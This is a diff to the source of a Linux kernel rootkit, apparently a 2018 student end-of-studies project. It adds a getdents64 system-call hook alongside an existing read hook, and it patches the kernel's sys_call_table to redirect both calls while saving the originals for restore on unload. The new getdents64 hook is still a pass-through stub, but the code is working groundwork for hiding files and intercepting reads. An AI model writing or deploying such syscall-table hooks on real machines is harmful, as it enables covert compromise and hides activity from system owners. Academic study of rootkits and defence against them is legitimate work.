@@ -2,19 +2,32 @@
   Hadrien Amrouche, Nicolas Grellety, Bowen Liu, Roland Mounier
   
   (c) 2018
-
   End of studies' project based on "Android platform based linux kernel rootkit".
 */
 #include <linux/kernel.h>
 #include <linux/module.h>
 
+#include <linux/dirent.h> // getdents
 #include <linux/string.h> // strstr, strcmp
 #include <linux/types.h>  // size_t
 #include <linux/unistd.h> // read, getuid
 
+
 unsigned long *sys_call_table = 0;
 
+asmlinkage int (*og_getdents64) (int fd,
+                                struct linux_dirent64 *dirp,
+                                unsigned int count);
 asmlinkage ssize_t (*og_read) (int fd, char *buf, size_t count);
+
+
+asmlinkage int
+hooked_getdents64(int fd,
+                struct linux_dirent64 *dirp,
+                unsigned int count) {
+  printk(KERN_INFO "Should not be here\n");
+  return og_getdents64(fd, dirp, count);
+}
 
 asmlinkage ssize_t
 hooked_read(int fd, char *buf, size_t count)
@@ -78,25 +91,31 @@ get_sys_call_table(void)
 }
 
 static int __init
-module_init(void) 
+rootkit_init(void) 
 {
   /* We could use grep sys_call System.map */
   get_sys_call_table();
   if (sys_call_table == 0x0)
     return -1; 
 
+  og_getdents64 = sys_call_table[__NR_getdents64];
   og_read = sys_call_table[__NR_read];
+
+  sys_call_table[__NR_getdents64] = hooked_getdents64;
   sys_call_table[__NR_read] = hooked_read;
-  
   return 0;
 }
 
 static int __exit
-module_exit(void)
+rootkit_exit(void)
 {
+  sys_call_table[__NR_getdents64] = og_getdents64;
   sys_call_table[__NR_read] = og_read;
   return 0;
 }
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Master CSI");
